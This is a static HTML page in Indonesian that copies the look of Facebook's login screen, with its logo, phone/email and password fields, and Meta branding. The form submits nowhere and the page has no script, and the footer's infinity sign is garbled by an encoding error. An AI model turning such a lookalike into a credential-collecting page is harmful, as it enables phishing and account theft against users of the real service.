<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Masuk</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        header {
            text-align: center;
            margin-bottom: 40px;
        }

        .language-notice {
            font-size: 14px;
            color: #65676b;
            margin-bottom: 30px;
        }

        .language-link {
            color: #1877f2;
            text-decoration: none;
        }

        .current-lang {
            font-weight: 600;
            margin-top: 10px;
        }

        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 40px;
            background-color: #1877f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 70px;
            font-weight: bold;
        }

        form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }

        input::placeholder {
            color: #8d949e;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            margin: 16px 0;
            cursor: pointer;
        }

        .forgot-password {
            text-align: center;
            margin: 20px 0;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }

        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dddfe2;
        }

        .create-account {
            display: block;
            width: 70%;
            max-width: 300px;
            margin: 0 auto;
            padding: 14px;
            background-color: #42b72a;
            color: white;
            text-align: center;
            font-weight: bold;
            font-size: 17px;
            border-radius: 6px;
            text-decoration: none;
        }

        footer {
            text-align: center;
            margin-top: 40px;
            font-size: 14px;
            color: #8a8d91;
        }

        .meta {
            margin-top: 30px;
        }

        .meta img {
            height: 20px;
            vertical-align: middle;
        }
    </style>
</head>
<body>
    <div class="container">
        <div>
            <header>
                <p class="language-notice">
                    Dapatkan Facebook untuk Android dan nikmati pengalaman menjelajah yang lebih cepat.
                </p>
                <p class="current-lang">
                    <a href="#" class="language-link">Bahasa Indonesia</a>
                </p>
            </header>

            <div class="logo">f</div>

            <form>
                <input type="text" placeholder="Nomor ponsel atau email" autocomplete="username">
                <input type="password" placeholder="Kata sandi" autocomplete="current-password">

                <button type="submit" class="login-btn">Login</button>

                <div class="forgot-password">
                    <a href="#">Lupa kata sandi?</a>
                </div>

                <div class="divider"></div>

                <a href="#" class="create-account">Buat akun baru</a>
            </form>
        </div>

        <footer>
            <div class="meta">
                <span>âˆž Meta</span>
            </div>
        </footer>
    </div>
</body>
</html>
